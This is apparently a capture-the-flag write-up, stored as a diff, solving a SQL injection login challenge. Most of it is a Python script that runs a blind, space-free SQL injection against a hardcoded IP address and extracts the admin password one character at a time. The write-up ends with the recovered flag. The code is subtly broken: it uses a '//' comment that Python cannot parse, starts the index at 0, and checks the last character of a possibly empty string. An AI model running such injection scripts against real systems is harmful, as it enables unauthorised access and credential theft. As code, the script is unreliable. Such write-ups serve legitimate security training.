@@ -1,0 +1,58 @@
+Observations :
+    1. Using Username "admin" and any password we get the correct credential displayed. So the goal is not to login.
+    2. If data sent in username field contains a space then sql injection detected is displayed. 
+    3. Using sqli without spaces (You will see how further) runs sqli successfully
+
+On this basis I try to guess the admin's password character by character.
+
+I used this python script :
+
+import sys
+import requests
+import string
+
+url = "http://18.222.194.174/SQL102/admin.php"
+
+
+def query(payload):
+    data = {"username": payload, "password": "lololo", "login": "Login"}
+    r = requests.post(url=url, data=data)
+
+    if "Incorrect Username/Password" in r.text:
+        # print(r.text)
+        return 0
+    else:
+        print(r.text)
+        return 1
+
+
+print(query("admin'and(ASCII(SUBSTRING(password,1,1)))=ASCII('D')and'1'='1"))
+
+flag = ''
+poss = [
+    '}', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
+    'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2',
+    '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
+    'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W',
+    'X', 'Y', 'Z', '_', '{' ,'?'
+]
+k=0
+while True:
+    for i in poss:
+        // the '1'='1 in the query is written because this query will be inserted in between quotes so I need to account for the closing quote
+        if query("admin'and(ASCII(SUBSTRING(password," + str(k) +
+                 ",1)))=ASCII('" + i + "')and'1'='1") == 1:
+            flag += i
+            k+=1
+            print("#########################################")
+            print(flag)
+            print("#########################################")
+            break
+    if flag[-1] == "}":
+        break
+
+correct credential is returned when the 1st character's ASCII matches that of the password and then we start checking the second character and so on
+
+the script prints the required flag :)
+
+Flag : CTCTf{ClouD_Y0u_eXpl41n_h0W_Bl1nd_5ql_inj3ct10n_w0rK_MaNu4l?}
